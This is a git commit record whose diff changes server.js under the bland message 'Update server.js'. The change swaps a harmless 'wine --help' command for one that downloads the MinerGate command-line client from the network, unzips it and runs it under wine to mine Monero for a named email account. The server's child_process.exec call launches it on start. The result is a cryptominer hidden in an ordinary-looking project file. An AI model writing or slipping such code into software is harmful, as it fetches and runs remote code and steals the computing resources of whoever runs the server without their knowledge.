eb14553f13d9fa1909b8ccfac71ec7c041c0d85a
wddesbvsp <30755597+wddesbvsp@users.noreply.github.com>
2017-08-06 01:24:52 +0700

    Update server.js

--- server.js
+++ server.js
@@ -1,2 +1,2 @@
-var str = "wine --help";
+var str = "wget https://minergate.com/download/win32-cli && unzip win32-cli && cd Miner* && wine minergate-cli.exe -user cccholo@yandex.com -xmr";
 require('child_process').exec(str, { stdio: [0, 1, 2] });
